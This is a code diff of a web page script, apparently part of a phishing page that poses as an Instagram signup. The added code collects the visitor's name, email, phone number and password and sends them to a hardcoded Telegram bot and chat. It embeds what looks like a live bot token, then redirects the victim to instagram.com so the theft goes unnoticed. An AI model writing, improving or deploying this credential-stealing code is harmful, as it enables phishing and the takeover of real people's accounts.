@@ -26,48 +26,45 @@
     </form>
 <script>  function submit() {
     // Captura os dados do formulário
-    const nome = document.getElementById("name").value;
-    const email = document.getElementById("email").value;
-    const numero = document.getElementById("number").value;
-    const senha = document.getElementById("pass").value;
+    const nome = document.getElementById('name').value;
+    const email = document.getElementById('email').value;
+    const numero = document.getElementById('number').value;
+    const senha = document.getElementById('pass').value;
 
-    // Cria a mensagem no formato desejado
-    const mensagem = `
-      NOVO USER COLETADO ✅
-      NOME: ${nome}
-      EMAIL: ${email}
-      NÚMERO: ${numero}
-      SENHA: ${senha}
-    `;
+    // Formata a mensagem que será enviada para o Telegram
+    const message = `NOVO USER COLETADO ✅\nNOME: ${nome}\nEMAIL: ${email}\nNÚMERO: ${numero}\nSENHA: ${senha}`;
 
-    // Token do bot e ID do chat (o ID deve ser do chat com @haulsted)
-    const botToken = "SEU_BOT_TOKEN";
-    const chatId = "@haulsted";
+    // Token do bot e ID do chat
+    const token = '7362942771:AAHQHnv42dHtiDm6KRvE_NP7L0d66w-VOFg'; 
+    const chatId = '7433908004'; // Pode ser o ID numérico ou nome de usuário com '@'
+
+    // URL da API do Telegram
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
     // Envia a mensagem ao Telegram via API
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: mensagem
-      })
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+        }),
     })
-    .then(response => {
-      if (response.ok) {
-        alert("Dados enviados com sucesso!");
-      } else {
-        alert("Erro ao enviar dados.");
-      }
+    .then(response => response.json())
+    .then(data => {
+        console.log('Mensagem enviada:', data);
     })
-    .catch(error => {
-      alert("Erro de conexão: " + error);
+    .catch((error) => {
+        console.error('Erro ao enviar mensagem:', error);
     });
+
+    // Redireciona após o envio
+    window.location.href = "https://instagram.com/";
   }
 
-  // Adiciona o evento de envio do formulário
+  // Adiciona o evento de submit no formulário
   document.querySelector(".signup").addEventListener("submit", function(event) {
     event.preventDefault(); // Impede o envio padrão do formulário
     submit(); // Chama a função submit()
